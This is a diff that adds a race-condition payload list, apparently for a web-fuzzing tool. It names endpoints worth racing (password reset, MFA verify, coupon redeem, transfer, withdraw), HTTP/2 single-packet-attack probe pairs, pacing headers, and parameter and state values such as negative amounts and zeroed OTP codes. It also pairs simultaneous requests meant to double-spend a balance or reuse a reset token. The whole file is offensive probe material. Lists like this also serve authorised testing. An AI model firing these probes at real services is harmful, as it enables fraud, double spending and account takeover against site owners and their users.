@@ -1,0 +1,75 @@
+# category: race-conditions
+# description: HTTP/2 single-packet-attack and TOCTOU race probes — auth, redeem, limit-step.
+# references: PortSwigger "Smashing the state machine", race-the-web.
+
+# ── Classic endpoints worth racing ───────────────────────────────────────
+/api/auth/password-reset
+/api/auth/login
+/api/auth/mfa/verify
+/api/auth/signup
+/api/coupon/redeem
+/api/coupon/apply
+/api/vote
+/api/like
+/api/follow
+/api/order/checkout
+/api/order/cancel
+/api/transfer
+/api/withdraw
+/api/credit/redeem
+/api/credit/apply
+/api/invite/accept
+/api/invite/claim
+/api/giftcard/redeem
+/api/nickname/change
+/api/username/change
+/api/2fa/enable
+/api/2fa/disable
+
+# ── HTTP/2 SPA (single-packet-attack) probe pairs ────────────────────────
+POST /api/limit-step HTTP/2  — send N identical requests in one TCP segment
+POST /api/password-reset HTTP/2 — reuse token twice simultaneously
+POST /api/coupon/redeem HTTP/2 — redeem the same coupon code N times
+
+# ── Headers that help pacing ─────────────────────────────────────────────
+X-Debug-Delay: 1000
+X-Rate-Limit: 0
+X-Priority: 0
+X-Camio-Pace: last-byte
+
+# ── Parameters worth racing ──────────────────────────────────────────────
+token=same-token-N-times
+coupon=FREESHIP
+code=000000
+otp=000000
+vote=up
+like=1
+follow=user123
+amount=1
+amount=0.01
+amount=-1
+quantity=1
+quantity=0
+quantity=-1
+
+# ── State transitions to try to double-fire ──────────────────────────────
+status=pending
+status=approved
+status=refunded
+status=redeemed
+status=consumed
+status=used
+step=1
+step=2
+step=final
+confirm=true
+is_used=false
+
+# ── CTF-style request-to-pair ────────────────────────────────────────────
+# Two simultaneous requests racing on a shared counter:
+POST /like + POST /like    (same user, same post)
+POST /password-reset?token=X + POST /password-reset?token=X
+POST /transfer amount=100 + POST /transfer amount=100  (balance=100)
+
+# ── Last-byte synchronisation primers (for HTTP/1 pipelining) ───────────
+GET / HTTP/1.1\r\nHost: x.test\r\n\r\nGET / HTTP/1.1\r\nHost: x.test\r\n\r\n
